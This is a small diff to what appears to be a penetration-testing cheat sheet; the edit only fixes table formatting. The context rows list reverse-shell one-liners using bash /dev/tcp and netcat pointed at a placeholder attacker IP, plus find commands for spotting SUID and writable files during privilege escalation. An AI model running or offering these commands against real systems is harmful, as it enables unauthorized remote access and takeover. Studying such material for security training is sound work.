@@ -292,7 +292,7 @@ Once the vulnerability has been exploited and you now have access to the operati
 | bash -i >& /dev/tcp/<your-ip>/<port> 0>&1  | A command used to begin a reverse shell via bash                                               |
 | nc -e /bin/sh <your-ip> <port>           | A command used to begin a reverse shell via Netcat                                             |
 | find / -perm -4000 -type f 2>/dev/null   | Finds SUID (Set User ID) files, useful in privilege escalation attempts                         |
-| find / -writable -type f 2>/dev/null | grep -v "/proc/"                               | Also helpful in privilege escalation attempts used to find files with writable permissions   |
+| find / -writable -type f 2>/dev/null | grep -v "/proc/" | Also helpful in privilege escalation attempts used to find files with writable permissions   |
 |
 
 
